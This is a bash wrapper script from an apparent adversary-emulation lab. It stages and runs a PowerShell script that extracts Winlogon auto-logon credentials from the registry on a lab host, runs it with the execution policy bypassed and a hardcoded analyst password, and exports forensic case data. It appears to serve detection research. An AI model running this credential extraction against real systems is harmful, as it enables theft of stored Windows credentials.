#!/usr/bin/env bash
# T035A — Winlogon auto-logon credential extraction on mbr01
# MITRE: T1552.002 (Unsecured Credentials: Credentials in Registry)
# DFIR: Sysmon 12/13, Security 4624/4648, WinRM 91/93
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T035A-WINLOGON-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t035a-winlogon-creds.ps1"


echo "=== T035A | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t035a-winlogon-creds.ps1"
# Ensure the reusable SYSTEM-exec helper is also staged
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-system-exec.ps1" "campaign-a-t043-system-exec.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t035a-winlogon-creds.ps1 -Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!'"

cadre_export "${CASE_ID}" T035A "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T035A complete ==="
